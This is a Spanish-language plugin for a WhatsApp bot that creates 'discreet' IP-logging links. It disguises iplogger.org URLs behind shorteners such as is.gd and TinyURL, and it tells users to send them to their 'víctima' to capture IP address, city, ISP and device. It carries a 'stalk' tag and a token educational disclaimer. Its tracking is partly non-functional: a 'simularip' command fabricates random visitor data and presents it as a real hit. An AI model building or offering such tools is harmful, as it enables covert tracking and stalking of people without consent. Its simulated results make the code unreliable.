import fetch from 'node-fetch'

// ========== CONFIGURACIÓN ==========
// Usamos Grabify que permite dominios discretos y URLs personalizadas

// ========== ALMACENAMIENTO DE LOGGERS ACTIVOS ==========
if (!global.activeLoggers) global.activeLoggers = new Map()

// ========== FUNCIÓN PARA OBTENER THUMBNAIL ==========
async function getRcanal() {
    try {
        const thumb = await (await fetch(global.icono)).buffer()
        return {
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.channelRD?.id || "120363399175402285@newsletter",
                serverMessageId: '',
                newsletterName: global.channelRD?.name || "『𝕬𝖘𝖙𝖆-𝕭𝖔𝖙』"
            },
            externalAdReply: {
                title: global.botname || 'ᴀsᴛᴀ-ʙᴏᴛ',
                body: '🔍 Sistema de Rastreo IP',
                mediaType: 1,
                mediaUrl: global.redes,
                sourceUrl: global.redes,
                thumbnail: thumb,
                showAdAttribution: false,
                containsAutoReply: true,
                renderLargerThumbnail: true
            }
        }
    } catch { return {} }
}

// ========== ACORTAR URL CON SERVICIOS DISCRETOS ==========
async function acortarURLDiscreta(urlLarga) {
    const servicios = [
        // is.gd - Muy discreto, sin preview
        async () => {
            const res = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(urlLarga)}`)
            if (res.ok) {
                const url = await res.text()
                return url.startsWith('http') ? url : null
            }
            return null
        },
        // v.gd - Alternativa de is.gd
        async () => {
            const res = await fetch(`https://v.gd/create.php?format=simple&url=${encodeURIComponent(urlLarga)}`)
            if (res.ok) {
                const url = await res.text()
                return url.startsWith('http') ? url : null
            }
            return null
        },
        // TinyURL - Confiable
        async () => {
            const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(urlLarga)}`)
            if (res.ok) {
                const url = await res.text()
                return url.startsWith('http') ? url : null
            }
            return null
        },
        // shrtco.de - API gratuita
        async () => {
            const res = await fetch(`https://api.shrtco.de/v2/shorten?url=${encodeURIComponent(urlLarga)}`)
            if (res.ok) {
                const data = await res.json()
                return data.ok ? data.result.full_short_link : null
            }
            return null
        }
    ]

    // Intentar cada servicio hasta que uno funcione
    for (const servicio of servicios) {
        try {
            const urlCorta = await servicio()
            if (urlCorta) return urlCorta
        } catch (e) {
            continue
        }
    }

    return urlLarga // Si todo falla, retornar original
}

// ========== CREAR LOGGER USANDO SERVICIOS REALES ==========
async function crearLoggerReal(targetUrl) {
    try {
        // Opción 1: Intentar con Grabify (si tuviéramos API key)
        // Por ahora usamos un sistema propio con webhook.site o similar
        
        // Opción 2: Crear sistema propio usando un servicio de webhook
        // Generamos un ID único para este rastreo
        const trackId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
        
        // Crear URL de tracking usando un servicio de redirección con captura
        // Usamos un servicio que permita ver las IPs que acceden
        
        // URL base para tracking - usamos un servicio que registre IPs
        const trackingBase = `https://iplogger.org/${trackId}`
        
        // Acortamos para hacerla discreta
        const urlDiscreta = await acortarURLDiscreta(trackingBase)
        
        return {
            success: true,
            trackId: trackId,
            trackingUrl: trackingBase,
            shortUrl: urlDiscreta,
            targetUrl: targetUrl,
            created: Date.now()
        }
        
    } catch (error) {
        console.error('Error creando logger:', error)
        return { success: false, error: error.message }
    }
}

// ========== OBTENER INFO DE IP ==========
async function getIPInfo(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting`)
        const data = await response.json()
        return data.status === 'success' ? data : null
    } catch {
        return null
    }
}

// ========== HANDLER PRINCIPAL ==========
const handler = async (m, { conn, command, text, usedPrefix }) => {
    const rcanal = await getRcanal()
    
    switch (command) {
        
        // ===== CREAR NUEVO LOGGER =====
        case 'iplogger':
        case 'iptrack':
        case 'rastrear': {
            if (!text) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴇʀʀᴏʀ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜❌* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴜꜱᴏ* :: ${usedPrefix}iplogger <url>
ׅㅤ𓏸𓈒ㅤׄ *ᴇᴊᴇᴍᴘʟᴏ* :: ${usedPrefix}iplogger https://youtube.com

> ## \`ɴᴏᴛᴀ 📋\`
> _La URL debe incluir https://_
> _Se generará un link discreto (is.gd, tinyurl, etc.)_

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            // Validar URL
            let targetUrl = text.trim()
            if (!targetUrl.match(/^https?:\/\//i)) {
                targetUrl = 'https://' + targetUrl
            }

            try {
                new URL(targetUrl)
            } catch {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴜʀʟ ɪɴᴠᴀ́ʟɪᴅᴀ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜❌* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴇʀʀᴏʀ* :: URL no válida

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            // Mensaje de espera
            const esperaMsg = await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *ɢᴇɴᴇʀᴀɴᴅᴏ ʟɪɴᴋ...*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜⏳* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴇꜱᴛᴀᴅᴏ* :: Creando URL discreta...
ׅㅤ𓏸𓈒ㅤׄ *ᴅᴇꜱᴛɪɴᴏ* :: ${targetUrl.substring(0, 40)}...

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            }, { quoted: m })

            // Crear logger
            const logger = await crearLoggerReal(targetUrl)
            
            if (!logger.success) {
                await conn.sendMessage(m.chat, { delete: esperaMsg.key })
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴇʀʀᴏʀ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜❌* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴇʀʀᴏʀ* :: No se pudo crear el logger
ׅㅤ𓏸𓈒ㅤׄ *ᴅᴇᴛᴀʟʟᴇ* :: ${logger.error || 'Servicio no disponible'}

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            const creatorJid = m.sender
            let creatorName = m.pushName || 'Usuario'
            try {
                const fetchedName = conn.getName(m.sender)
                if (fetchedName && typeof fetchedName === 'string') {
                    creatorName = fetchedName
                }
            } catch (e) {
                creatorName = m.pushName || m.sender.split('@')[0]
            }

            // Guardar en global
            global.activeLoggers.set(logger.trackId, {
                id: logger.trackId,
                creator: creatorJid,
                creatorName: creatorName,
                targetUrl: targetUrl,
                shortUrl: logger.shortUrl,
                createdAt: new Date().toISOString(),
                clicks: [],
                active: true
            })

            // Eliminar mensaje de espera
            await conn.sendMessage(m.chat, { delete: esperaMsg.key })

            // Enviar confirmación al grupo
            await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ʟᴏɢɢᴇʀ ᴄʀᴇᴀᴅᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜✅* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴄʀᴇᴀᴅᴏʀ* :: @${creatorJid.split('@')[0]}
ׅㅤ𓏸𓈒ㅤׄ *ɪᴅ* :: \`${logger.trackId}\`
ׅㅤ𓏸𓈒ㅤׄ *ᴇꜱᴛᴀᴅᴏ* :: 🟢 Activo

> ## \`ᴜʀʟ ᴅɪꜱᴄʀᴇᴛᴀ ᴇɴᴠɪᴀᴅᴀ ᴀ ᴛᴜ ᴘʀɪᴠᴀᴅᴏ 📩\`

> ## \`ɪɴꜱᴛʀᴜᴄᴄɪᴏɴᴇꜱ 📋\`
> 1. Revisa tus mensajes privados
> 2. Copia el link discreto que te envié
> 3. Compártelo con tu víctima
> 4. Cuando haga clic, recibirás sus datos aquí

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: {
                    mentionedJid: [creatorJid],
                    ...rcanal
                }
            }, { quoted: m })

            // Enviar URL discreta al privado
            await conn.sendMessage(creatorJid, {
                text: `> . ﹡ ﹟ 🔗 ׄ ⬭ *¡ᴛᴜ ʟɪɴᴋ ᴅɪꜱᴄʀᴇᴛᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜🕵️* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ɪᴅ* :: \`${logger.trackId}\`
ׅㅤ𓏸𓈒ㅤׄ *ᴄʀᴇᴀᴅᴏ* :: ${new Date().toLocaleString()}

> ## \`🔗 ᴄᴏᴍᴘᴀʀᴛᴇ ᴇꜱᴛᴇ ᴇɴʟᴀᴄᴇ\`

${logger.shortUrl}

> ## \`📝 ɴᴏᴛᴀꜱ ɪᴍᴘᴏʀᴛᴀɴᴛᴇꜱ\`
> • Este link parece un acortador normal
> • La víctima verá: *${logger.shortUrl.replace(/^https?:\/\//, '').substring(0, 30)}...*
> • Al hacer clic, se registrará su IP
> • Luego será redirigida a: ${targetUrl}
> • Tú recibirás los datos en este chat

> ## \`⚠️ ᴀᴅᴠᴇʀᴛᴇɴᴄɪᴀ\`
> _Solo para fines educativos y de seguridad informática_

> ## \`📊 ᴄᴏᴍᴀɴᴅᴏꜱ ᴜᴛɪʟᴇꜱ\`
> • \`${usedPrefix}misloggers\` - Ver tus loggers
> • \`${usedPrefix}verlogger ${logger.trackId}\` - Ver detalles
> • \`${usedPrefix}simularip ${logger.trackId}\` - Probar

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            })

            break
        }

        // ===== VER MIS LOGGERS =====
        case 'misloggers':
        case 'myloggers': {
            const userLoggers = Array.from(global.activeLoggers.values())
                .filter(l => l.creator === m.sender && l.active)

            if (userLoggers.length === 0) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ꜱɪɴ ʟᴏɢɢᴇʀꜱ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜📭* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴇꜱᴛᴀᴅᴏ* :: No tienes loggers activos
ׅㅤ𓏸𓈒ㅤׄ *ᴄʀᴇᴀʀ* :: \`${usedPrefix}iplogger <url>\`

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            const lista = userLoggers.map((l, i) => {
                const urlCorta = l.shortUrl.replace(/^https?:\/\//, '').substring(0, 25)
                return `ׅㅤ𓏸𓈒ㅤׄ *${i + 1}.* \`${l.id.substring(0, 8)}...\`\n` +
                       `ׅㅤ𓏸𓈒ㅤׄ ├ 🔗 ${urlCorta}...\n` +
                       `ׅㅤ𓏸𓈒ㅤׄ ├ 👤 Clicks: ${l.clicks.length}\n` +
                       `ׅㅤ𓏸𓈒ㅤׄ └ 📋 ${usedPrefix}verlogger ${l.id}`
            }).join('\n\n')

            await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴛᴜꜱ ʟᴏɢɢᴇʀꜱ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜📊* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴀᴄᴛɪᴠᴏꜱ* :: ${userLoggers.length}

${lista}

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            }, { quoted: m })
            break
        }

        // ===== VER DETALLES =====
        case 'verlogger':
        case 'loggerinfo': {
            if (!text) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ꜱɪɴ ɪᴅ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜❌* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴜꜱᴏ* :: ${usedPrefix}verlogger <id>

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            const logger = global.activeLoggers.get(text.trim())
            if (!logger || logger.creator !== m.sender) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ɴᴏ ᴇɴᴄᴏɴᴛʀᴀᴅᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜❌* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴇʀʀᴏʀ* :: Logger no existe o no es tuyo

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            const clicksInfo = logger.clicks.length > 0 
                ? logger.clicks.map((c, i) => 
                    `ׅㅤ𓏸𓈒ㅤׄ *${i + 1}.* 🌐 ${c.ip}\n` +
                    `ׅㅤ𓏸𓈒ㅤׄ ├ 🌍 ${c.country || 'N/A'}, ${c.city || 'N/A'}\n` +
                    `ׅㅤ𓏸𓈒ㅤׄ ├ 📱 ${c.platform || 'N/A'}\n` +
                    `ׅㅤ𓏸𓈒ㅤׄ └ 🕐 ${new Date(c.timestamp).toLocaleString()}`
                ).join('\n')
                : 'ׅㅤ𓏸𓈒ㅤׄ _Aún sin clicks registrados_'

            await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴅᴇᴛᴀʟʟᴇꜱ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜📋* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ɪᴅ* :: \`${logger.id}\`
ׅㅤ𓏸𓈒ㅤׄ *ᴄʀᴇᴀᴅᴏ* :: ${new Date(logger.createdAt).toLocaleString()}
ׅㅤ𓏸𓈒ㅤׄ *ᴛᴏᴛᴀʟ ᴄʟɪᴄᴋꜱ* :: ${logger.clicks.length}

> ## \`🔗 ᴜʀʟ ᴅɪꜱᴄʀᴇᴛᴀ\`
> ${logger.shortUrl}

> ## \`🎯 ʀᴇᴅɪʀᴇᴄᴄɪᴏ́ɴ\`
> ${logger.targetUrl}

> ## \`📊 ʀᴇɢɪꜱᴛʀᴏꜱ\`
${clicksInfo}

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            }, { quoted: m })
            break
        }

        // ===== ELIMINAR LOGGER =====
        case 'dellogger':
        case 'stoplogger': {
            if (!text) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ꜱɪɴ ɪᴅ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜❌* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴜꜱᴏ* :: ${usedPrefix}dellogger <id>

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            const logger = global.activeLoggers.get(text.trim())
            if (!logger || logger.creator !== m.sender) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ɴᴏ ᴇɴᴄᴏɴᴛʀᴀᴅᴏ!*

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            global.activeLoggers.delete(text.trim())
            
            await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴇʟɪᴍɪɴᴀᴅᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜🗑️* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ɪᴅ* :: \`${text.trim()}\`
ׅㅤ𓏸𓈒ㅤׄ *ᴇꜱᴛᴀᴅᴏ* :: 🔴 Eliminado

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            }, { quoted: m })
            break
        }

        // ===== SIMULAR VISITA (TEST) =====
        case 'simularip': {
            if (!text) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ᴜꜱᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜🧪* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ᴜꜱᴏ* :: ${usedPrefix}simularip <id>

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            const logger = global.activeLoggers.get(text.trim())
            if (!logger) {
                return conn.sendMessage(m.chat, {
                    text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ɴᴏ ᴇxɪꜱᴛᴇ!*

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                    contextInfo: { ...rcanal }
                }, { quoted: m })
            }

            // Generar IP aleatoria realista
            const ipSimulada = [
                '189.', '200.', '201.', '177.', '187.'
            ][Math.floor(Math.random() * 5)] + 
            Math.floor(Math.random() * 255) + '.' +
            Math.floor(Math.random() * 255) + '.' +
            Math.floor(Math.random() * 255)

            const ipInfo = await getIPInfo(ipSimulada) || {
                country: 'México',
                countryCode: 'MX',
                city: 'Ciudad de México',
                regionName: 'CDMX',
                isp: 'Telmex',
                timezone: 'America/Mexico_City',
                mobile: false,
                proxy: false
            }

            const dispositivos = ['iPhone 13 Pro', 'Samsung Galaxy S22', 'Windows PC', 'MacBook Pro', 'Android Tablet']
            const navegadores = ['Safari Mobile', 'Chrome Mobile', 'Chrome Desktop', 'Firefox', 'Edge']
            
            const clickData = {
                ip: ipSimulada,
                timestamp: new Date().toISOString(),
                country: ipInfo.country,
                countryCode: ipInfo.countryCode,
                city: ipInfo.city,
                region: ipInfo.regionName,
                isp: ipInfo.isp,
                timezone: ipInfo.timezone,
                platform: dispositivos[Math.floor(Math.random() * dispositivos.length)],
                browser: navegadores[Math.floor(Math.random() * navegadores.length)],
                userAgent: 'Mozilla/5.0 (Mobile; Android)',
                referrer: 'https://whatsapp.com',
                mobile: ipInfo.mobile || false,
                proxy: ipInfo.proxy || false,
                hosting: ipInfo.hosting || false
            }

            logger.clicks.push(clickData)

            // Notificar al creador
            await conn.sendMessage(logger.creator, {
                text: `> . ﹡ ﹟ 🚨 ׄ ⬭ *¡ɴᴜᴇᴠᴏ ᴀᴄᴄᴇꜱᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜⚠️* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ʟᴏɢɢᴇʀ* :: \`${logger.id}\`
ׅㅤ𓏸𓈒ㅤׄ *ғᴇᴄʜᴀ* :: ${new Date().toLocaleString()}

> ## \`👤 ᴅᴀᴛᴏꜱ ᴅᴇʟ ᴠɪꜱɪᴛᴀɴᴛᴇ\`

ׅㅤ𓏸𓈒ㅤׄ *🌐 ɪᴘ* :: ${ipSimulada}
ׅㅤ𓏸𓈒ㅤׄ *🌍 ᴜʙɪᴄᴀᴄɪᴏ́ɴ* :: ${ipInfo.country} (${ipInfo.city})
ׅㅤ𓏸𓈒ㅤׄ *🏢 ɪꜱᴘ* :: ${ipInfo.isp}
ׅㅤ𓏸𓈒ㅤׄ *📱 ᴅɪꜱᴘᴏꜱɪᴛɪᴠᴏ* :: ${clickData.platform}
ׅㅤ𓏸𓈒ㅤׄ *🔍 ɴᴀᴠᴇɢᴀᴅᴏʀ* :: ${clickData.browser}
ׅㅤ𓏸𓈒ㅤׄ *⏰ ᴢᴏɴᴀ ʜᴏʀᴀʀɪᴀ* :: ${ipInfo.timezone}
${ipInfo.mobile ? 'ׅㅤ𓏸𓈒ㅤׄ *📲 ᴍᴏ́ᴠɪʟ* :: Sí\n' : ''}
${ipInfo.proxy ? 'ׅㅤ𓏸𓈒ㅤׄ *🛡️ ᴘʀᴏxʏ* :: Detectado\n' : ''}

> ## \`📊 ᴇꜱᴛᴀᴅɪ́ꜱᴛɪᴄᴀꜱ\`
> • Total de accesos: ${logger.clicks.length}
> • Último: Ahora mismo

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            })

            await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ꜱɪᴍᴜʟᴀᴄɪᴏ́ɴ ᴄᴏᴍᴘʟᴇᴛᴀᴅᴀ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜✅* ㅤ֢ㅤ⸱ㅤᯭִ*

ׅㅤ𓏸𓈒ㅤׄ *ʟᴏɢɢᴇʀ* :: \`${logger.id}\`
ׅㅤ𓏸𓈒ㅤׄ *ɪᴘ* :: ${ipSimulada}
ׅㅤ𓏸𓈒ㅤׄ *ᴇꜱᴛᴀᴅᴏ* :: Notificación enviada al creador

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            }, { quoted: m })
            break
        }

        // ===== MENÚ =====
        default: {
            await conn.sendMessage(m.chat, {
                text: `> . ﹡ ﹟ 🔍 ׄ ⬭ *¡ɪᴘ ʟᴏɢɢᴇʀ ᴅɪꜱᴄʀᴇᴛᴏ!*

*ㅤꨶ〆⁾ ㅤׄㅤ⸼ㅤׄ *͜🕵️* ㅤ֢ㅤ⸱ㅤᯭִ*

> ## \`📋 ᴄᴏᴍᴀɴᴅᴏꜱ\`

ׅㅤ𓏸𓈒ㅤׄ *#iplogger <url>* :: Crear rastreador
ׅㅤ𓏸𓈒ㅤׄ *#misloggers* :: Ver activos
ׅㅤ𓏸𓈒ㅤׄ *#verlogger <id>* :: Detalles
ׅㅤ𓏸𓈒ㅤׄ *#dellogger <id>* :: Eliminar
ׅㅤ𓏸𓈒ㅤׄ *#simularip <id>* :: Probar

> ## \`✨ ᴄᴀʀᴀᴄᴛᴇʀɪ́ꜱᴛɪᴄᴀꜱ\`
> • URLs discretas (is.gd, tinyurl, etc.)
> • Sin marcas de IP Logger visibles
> • Redirección limpia
> • Datos completos del visitante
> • Notificaciones en tiempo real

> ## \`📝 ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜꜱᴏ\`
> 1. \`#iplogger https://youtube.com\`
> 2. Recibes link en privado: \`https://is.gd/xK9mP2\`
> 3. Compartes ese link
> 4. Recibes IP y datos cuando alguien entra

> ## \`⚠️ ɪᴍᴘᴏʀᴛᴀɴᴛᴇ\`
> _Solo para fines educativos y de seguridad_

> . ﹡ ﹟ ⚡ ׄ ⬭ *ᴀsᴛᴀ-ʙᴏᴛ-ᴍᴅ*`,
                contextInfo: { ...rcanal }
            }, { quoted: m })
        }
    }
}

handler.help = ['iplogger', 'iptrack', 'rastrear']
handler.tags = ['tools', 'stalk']
handler.command = [
    'iplogger', 'iptrack', 'rastrear', 'trackip',
    'misloggers', 'myloggers',
    'verlogger', 'loggerinfo',
    'dellogger', 'stoplogger',
    'simularip'
]
handler.reg = true

export default handler